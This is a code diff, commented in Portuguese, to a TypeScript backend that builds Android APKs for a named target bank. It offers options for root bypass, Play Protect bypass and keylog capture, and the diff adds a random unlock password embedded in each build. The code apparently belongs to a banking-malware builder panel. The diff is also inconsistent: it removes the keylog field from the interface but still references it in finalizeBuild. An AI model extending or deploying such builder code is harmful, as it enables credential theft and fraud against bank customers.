@@ -31,7 +31,7 @@ interface BuildJob {
   bankName?: string;
   enableRootBypass?: boolean;
   enablePlayProtectBypass?: boolean;
-  enableKeylogCapture?: boolean;
+  unlockPassword?: string; // ✅ ADICIONADO: Senha de desbloqueio
   downloadUrl?: string;
   deliveryMode: DeliveryMode;
   artifactSource?: ArtifactSource;
@@ -48,9 +48,7 @@ export interface RuntimeApkConfig {
   bankId?: string;
   bankCountry?: string;
   bankName?: string;
-  enableRootBypass?: boolean;
-  enablePlayProtectBypass?: boolean;
-  enableKeylogCapture?: boolean;
+  unlockPassword?: string; // ✅ ADICIONADO: Senha de desbloqueio
   artifactSource?: ArtifactSource;
   createdAt: string;
   updatedAt: string;
@@ -58,6 +56,16 @@ export interface RuntimeApkConfig {
 
 // Simulação de fila de builds (em produção, usar Redis ou banco de dados)
 const buildJobs = new Map<string, BuildJob>();
+
+// ✅ ADICIONADO: Função para gerar senha aleatória
+function generateRandomPassword(length: number = 6): string {
+  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  let password = '';
+  for (let i = 0; i < length; i++) {
+    password += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return password;
+}
 
 export function getBuildJobById(buildId: string): BuildJob | undefined {
   return buildJobs.get(buildId);
@@ -83,9 +91,7 @@ export function getLatestRuntimeApkConfig(packageName?: string): RuntimeApkConfi
     bankId: latest.bankId,
     bankCountry: latest.bankCountry,
     bankName: latest.bankName,
-    enableRootBypass: latest.enableRootBypass,
-    enablePlayProtectBypass: latest.enablePlayProtectBypass,
-    enableKeylogCapture: latest.enableKeylogCapture,
+    unlockPassword: latest.unlockPassword, // ✅ ADICIONADO
     artifactSource: latest.artifactSource,
     createdAt: latest.createdAt.toISOString(),
     updatedAt: latest.updatedAt.toISOString(),
@@ -123,12 +129,13 @@ export const apkRouter = router({
         bankName: z.string().min(1),
         enableRootBypass: z.boolean().optional(),
         enablePlayProtectBypass: z.boolean().optional(),
-        enableKeylogCapture: z.boolean().optional(),
         deliveryMode: z.enum(['auto', 'eas', 'storage', 'local']).optional(),
       })
     )
     .mutation(async ({ input }) => {
       const buildId = nanoid();
+      // ✅ ADICIONADO: Gerar senha aleatória
+      const unlockPassword = generateRandomPassword(6);
 
       const job: BuildJob = {
         id: buildId,
@@ -146,7 +153,7 @@ export const apkRouter = router({
         bankName: input.bankName,
         enableRootBypass: input.enableRootBypass,
         enablePlayProtectBypass: input.enablePlayProtectBypass,
-        enableKeylogCapture: input.enableKeylogCapture,
+        unlockPassword, // ✅ ADICIONADO: Armazenar senha
         deliveryMode: input.deliveryMode ?? 'auto',
         createdAt: new Date(),
         updatedAt: new Date(),
@@ -160,6 +167,7 @@ export const apkRouter = router({
       return {
         buildId,
         message: 'Build iniciado com sucesso',
+        unlockPassword, // ✅ ADICIONADO: Retornar senha
       };
     }),
 
@@ -183,6 +191,7 @@ export const apkRouter = router({
         status: job.status,
         progress: job.progress,
         message: job.message,
+        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Retornar senha
         downloadUrl: job.downloadUrl ? toAbsoluteDownloadUrl(job.downloadUrl, ctx.req) : undefined,
         artifactSource: job.artifactSource,
       };
@@ -200,6 +209,7 @@ export const apkRouter = router({
         appName: job.appName,
         status: job.status,
         progress: job.progress,
+        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Retornar senha
         createdAt: job.createdAt,
         downloadUrl: job.downloadUrl ? toAbsoluteDownloadUrl(job.downloadUrl, ctx.req) : undefined,
         artifactSource: job.artifactSource,
@@ -321,6 +331,7 @@ async function finalizeBuild(job: BuildJob): Promise<void> {
         enableRootBypass: job.enableRootBypass,
         enablePlayProtectBypass: job.enablePlayProtectBypass,
         enableKeylogCapture: job.enableKeylogCapture,
+        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Passar senha para APK
       });
 
       const uploaded = await storagePut(
@@ -367,6 +378,7 @@ async function persistRuntimeConfig(job: BuildJob): Promise<void> {
       bankId: job.bankId,
       bankCountry: job.bankCountry,
       bankName: job.bankName,
+      unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Salvar senha
       artifactSource: job.artifactSource,
     });
   } catch (error) {
